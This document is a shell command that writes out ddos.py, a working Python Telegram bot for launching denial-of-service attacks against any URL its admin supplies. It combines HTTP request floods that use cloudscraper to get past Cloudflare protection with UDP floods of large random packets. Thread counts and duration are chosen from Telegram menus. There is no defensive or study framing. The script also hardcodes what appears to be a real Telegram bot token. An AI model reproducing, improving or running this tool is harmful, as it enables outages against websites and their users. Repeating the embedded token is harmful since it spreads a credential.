cat > ddos.py << 'EOF'
import requests
import time
import threading
import random
import socket
import asyncio
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
import cloudscraper

TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 6120560770

attack_active = False
user_state = {}

def create_cf_session():
    return cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'desktop': True
        }
    )

def send_request_worker(url):
    session = create_cf_session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while attack_active:
        try:
            session.get(url + f"?_{random.randint(1,999999)}", headers=headers, timeout=3)
            session.post(url, data={"d": random.randint(1,9999)}, timeout=3)
        except:
            session = create_cf_session()

def udp_worker(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    while attack_active:
        try:
            sock.sendto(packet, (ip, port))
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def start_stealth_operation(url, threads, duration_seconds):
    global attack_active
    attack_active = True
    from urllib.parse import urlparse
    parsed = urlparse(url)
    target_host = parsed.hostname
    target_port = 443 if parsed.scheme == "https" else 80
    target_ip = socket.gethostbyname(target_host)
    for _ in range(threads // 2):
        t = threading.Thread(target=send_request_worker, args=(url,))
        t.daemon = True
        t.start()
    for _ in range(threads // 2):
        t = threading.Thread(target=udp_worker, args=(target_ip, target_port))
        t.daemon = True
        t.start()
    time.sleep(duration_seconds)
    attack_active = False

def start(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    user_state[update.effective_user.id] = {"step": "awaiting_target"}
    update.message.reply_text(
        "🔧 *System Ready* 🔧\n\nSend me the target URL:\nExample: `https://example.com`",
        parse_mode='Markdown'
    )

def handle_message(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    state = user_state.get(user_id, {})
    message = update.message.text.strip()
    if state.get("step") == "awaiting_target":
        if message.startswith("http"):
            user_state[user_id] = {"step": "awaiting_threads", "target": message}
            keyboard = [
                [InlineKeyboardButton("⚡ 300 Threads", callback_data="threads_300")],
                [InlineKeyboardButton("⚡ 1000 Threads", callback_data="threads_1000")],
                [InlineKeyboardButton("⚡ 2000 Threads", callback_data="threads_2000")],
                [InlineKeyboardButton("⚡ 5000 Threads", callback_data="threads_5000")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(
                f"🎯 *Target Set:* `{message}`\n\nSelect Thread Count:",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
        else:
            update.message.reply_text("❌ Send valid URL starting with http:// or https://")
    elif state.get("step") == "awaiting_custom_duration":
        try:
            duration_value = int(message)
            user_state[user_id]["duration"] = duration_value
            user_state[user_id]["step"] = "done"
            update.message.reply_text(
                f"🔥 *ATTACK STARTED*\nTarget: `{user_state[user_id]['target']}`\nThreads: {user_state[user_id]['threads']}\nDuration: {duration_value}s",
                parse_mode='Markdown'
            )
            def run_attack():
                start_stealth_operation(user_state[user_id]['target'], user_state[user_id]['threads'], duration_value)
            thread = threading.Thread(target=run_attack)
            thread.start()
        except ValueError:
            update.message.reply_text("❌ Send valid number (seconds):")

def button_handler(update, context):
    query = update.callback_query
    query.answer()
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        query.edit_message_text("❌ Unauthorized")
        return
    data = query.data
    if data.startswith("threads_"):
        threads = int(data.split("_")[1])
        user_state[user_id]["threads"] = threads
        user_state[user_id]["step"] = "awaiting_custom_duration"
        keyboard = [
            [InlineKeyboardButton("⏱️ 10s", callback_data="dur_10")],
            [InlineKeyboardButton("⏱️ 60s", callback_data="dur_60")],
            [InlineKeyboardButton("⏱️ 300s", callback_data="dur_300")],
            [InlineKeyboardButton("📝 Custom", callback_data="dur_custom")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            f"Target: `{user_state[user_id]['target']}`\nThreads: {threads}\n\nSelect Duration:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    elif data.startswith("dur_"):
        duration_map = {"dur_10": 10, "dur_60": 60, "dur_300": 300}
        if data in duration_map:
            duration = duration_map[data]
            user_state[user_id]["duration"] = duration
            user_state[user_id]["step"] = "done"
            query.edit_message_text(
                f"🔥 *ATTACK STARTED*\nTarget: `{user_state[user_id]['target']}`\nThreads: {user_state[user_id]['threads']}\nDuration: {duration}s",
                parse_mode='Markdown'
            )
            def run_attack():
                start_stealth_operation(user_state[user_id]['target'], user_state[user_id]['threads'], duration)
            thread = threading.Thread(target=run_attack)
            thread.start()
        elif data == "dur_custom":
            user_state[user_id]["step"] = "awaiting_custom_duration"
            query.edit_message_text("📝 Type custom duration in seconds:")

def stop(update, context):
    global attack_active
    if update.effective_user.id != ADMIN_ID:
        return
    attack_active = False
    update.message.reply_text("🛑 Attack stopped.")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    print("✅ Bot is running...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
EOF
